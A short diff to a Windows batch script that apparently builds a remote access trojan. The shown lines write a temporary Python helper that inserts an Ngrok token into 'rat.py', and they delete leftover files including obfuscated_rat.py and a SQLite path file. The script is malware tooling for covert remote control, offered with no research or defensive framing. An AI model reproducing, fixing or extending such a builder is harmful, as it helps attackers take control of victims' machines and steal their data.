@@ -48,7 +48,7 @@ if not exist "rat.py" (
 echo Creating modified Python file with Ngrok token...
 
 rem Crear archivo Python temporal para procesar el token
-echo import sys > temp_process.py
+echo import sys >> temp_process.py
 echo. >> temp_process.py
 echo with open('rat.py', 'r', encoding='utf-8') as f: >> temp_process.py
 echo     content = f.read() >> temp_process.py
@@ -217,3 +217,4 @@ if exist obfuscated_rat.py del obfuscated_rat.py 2>nul
 if exist sqlite_path.tmp del sqlite_path.tmp 2>nul
 if exist temp_process.py del temp_process.py 2>nul
 exit /b 0
+
